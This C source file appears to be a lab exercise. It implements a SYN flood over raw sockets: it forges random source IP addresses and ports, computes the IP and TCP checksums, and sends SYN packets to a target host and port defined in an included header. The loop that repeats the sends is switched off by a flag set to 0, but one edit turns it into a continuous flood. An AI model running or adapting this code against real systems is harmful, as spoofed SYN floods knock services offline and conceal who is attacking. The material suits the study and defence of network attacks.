/*
 * rawip_example.c
 *
 *  Created on: May 4, 2016
 *      Author: jiaziyi
 */

#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include <stdlib.h> // for rand()


#include "header.h"
#include "VM_syn_flood.h"

#define PORT_MAX 65535
// RAND_MAX = 2147483647

struct pseudo_header
{
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t tcp_length;
};


int main(int argc, char *argv[])
{
	int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    int hincl =1 ;                  /* 1 = on, 0 = off */
    setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
	if(sockfd < 0){
		perror("Error creating raw socket ");
		exit(1);
	}
	int flood=0;
	do{

		char packet[65536];
		memset(packet, 0, 65536);

		fil_up_syn_flood_rawheader(packet);
		
		send_message(sockfd,packet);
	}while(flood);
	
}

void fil_up_syn_flood_rawheader(char *packet){

	char *data;
	char *data_string = TEST_STRING;

	//data section pointer
	data = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);

	//fill the data section
	strncpy(data, data_string, strlen(data_string));

	//IP header 
	struct iphdr *iph = (struct iphdr *)packet;
	random_IP_header(iph);
	
	//TCP header 
	struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
	random_TCP_header(tcph,iph->saddr,iph->daddr);
}


void random_IP_header(struct iphdr *iph){
	
	char  random_source_ip[16] ;
	int r1= rand()%256;
	int r2= rand()%256;
	int r3= rand()%256;
	int r4= rand()%256;
	printf("%d, %d,%d,%d\n",r1,r2,r3,r4);
	
	sprintf(random_source_ip,"%d.%d.%d.%d",r1,r2,r3,r4);
	printf("this is the source_ip: %s\n",random_source_ip);
	iph->version=4;
	iph->ihl=5;// there 5*4 byte
	iph->tos= 0; 
	iph->tot_len=sizeof(struct iphdr)+sizeof(struct tcphdr)+strlen(TEST_STRING);    

	iph->id=htons(1);
	iph->frag_off=0;
	iph->ttl=255;
	iph->protocol=IPPROTO_TCP; // tcp service https://www.iana.org/assignments/protocol-numbers/protocol-numbers.xhtml
	iph->check=0;
	iph->saddr=inet_addr(random_source_ip);//find source random_ip;	
	iph->daddr=inet_addr(VM_IP);
	iph->check=checksum((unsigned short *)iph, sizeof(struct iphdr));

}

void random_TCP_header(struct tcphdr *tcph,unsigned int source_address,unsigned int dest_address){
	struct pseudo_header psh; //pseudo header for calculate chechsum
	
	
	//fill the TCP header

	int random_source_port = rand()%PORT_MAX;
	printf("The source_port:%d\n",random_source_port);
	tcph ->source = htons(random_source_port);//ramdom port
	tcph ->dest = htons(VM_PORT);
	tcph->seq = 0;
	tcph->ack_seq = 0;
	tcph->doff = 5;		/* first and only tcp segment */
	tcph->fin=0;
	tcph->syn=1;
	tcph->rst=0;
	tcph->psh=0;
	tcph->ack=0;
	tcph->urg=0;
	tcph->window = htons (5840);	/* maximum allowed window size */
	tcph->check = 0;/* if you set a checksum to zero, your kernel's IP stack
				should fill in the correct checksum during transmission */
	tcph->urg_ptr = 0;
	

	//fill the TCP pseudo header
	psh.source_address=source_address;//iph->saddr;
	psh.dest_address=dest_address;//iph->daddr;
	psh.placeholder=0;
	psh.protocol=IPPROTO_TCP;
	psh.tcp_length=htons(sizeof(struct tcphdr)+strlen(TEST_STRING));
	

	int psize=sizeof(struct pseudo_header) + sizeof(struct tcphdr)+strlen(TEST_STRING);
	char *pseudogram=malloc(psize);
	memcpy(pseudogram, (char *)&psh,sizeof(struct pseudo_header));
	memcpy(pseudogram+sizeof(struct pseudo_header),tcph,sizeof(struct tcphdr)+strlen(TEST_STRING));

	tcph->check=checksum((unsigned short *) pseudogram,psize);
	free(pseudogram);
}

void send_message(int sockfd,char *send_packet){
	
	struct iphdr *iph = (struct iphdr *)send_packet;
	struct tcphdr *tcph = (struct tcphdr *)(send_packet + sizeof(struct iphdr));
	struct sockaddr_in to;
    memset(&to,0,sizeof(struct sockaddr_in));
    to.sin_family=AF_INET;
    to.sin_port=tcph->dest;
	to.sin_addr.s_addr=iph->daddr;

		//Send the packet
	if (sendto (sockfd,		/* our socket */
				send_packet,	/* the buffer containing headers and data */
				iph->tot_len,	/* total length of our datagram */
				0,		/* routing flags, normally always 0 */
				(struct sockaddr *) &to,	/* socket addr, just like in */
				sizeof (struct sockaddr_in)) < 0)		/* a normal send() */
	{
		printf ("error\n");
	}
	//Data send successfully
	else
	{
		printf ("Packet Send \n");
	}


}